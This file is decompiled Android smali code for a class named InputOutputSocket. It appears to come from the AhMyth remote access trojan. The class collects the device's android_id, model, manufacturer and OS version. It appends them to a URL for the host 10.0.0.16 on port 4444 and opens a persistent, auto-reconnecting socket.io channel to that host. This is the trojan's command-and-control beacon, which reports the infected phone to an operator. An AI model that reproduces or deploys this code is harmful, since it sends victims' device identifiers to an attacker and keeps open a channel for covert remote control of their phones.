.class public Lahmyth/mine/king/ahmyth/config/InputOutputSocket;
.super Ljava/lang/Object;
.source "InputOutputSocket.java"


# static fields
.field private static final ourInstance:Lahmyth/mine/king/ahmyth/config/InputOutputSocket;


# instance fields
.field ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 14
    new-instance v0, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->ourInstance:Lahmyth/mine/king/ahmyth/config/InputOutputSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 4

    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 19
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/services/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 20
    .local v0, "deviceID":Ljava/lang/String;
    new-instance v1, Lio/socket/client/IO$Options;

    invoke-direct {v1}, Lio/socket/client/IO$Options;-><init>()V

    .line 21
    .local v1, "opts":Lio/socket/client/IO$Options;
    const/4 v2, 0x1

    iput-boolean v2, v1, Lio/socket/client/IO$Options;->reconnection:Z

    .line 22
    const-wide/16 v2, 0x1388

    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelay:J

    .line 23
    const-wide/32 v2, 0x3b9ac9ff

    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 25
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "http://10.0.0.16:4444?model="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v3}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "&manf="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "&release="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "&id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;

    move-result-object v2

    iput-object v2, p0, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->ioSocket:Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 29
    .end local v0    # "deviceID":Ljava/lang/String;
    .end local v1    # "opts":Lio/socket/client/IO$Options;
    goto :goto_0

    .line 27
    :catch_0
    move-exception v0

    .line 28
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 30
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public static getInstance()Lahmyth/mine/king/ahmyth/config/InputOutputSocket;
    .locals 1

    .line 33
    sget-object v0, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->ourInstance:Lahmyth/mine/king/ahmyth/config/InputOutputSocket;

    return-object v0
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 1

    .line 37
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/config/InputOutputSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
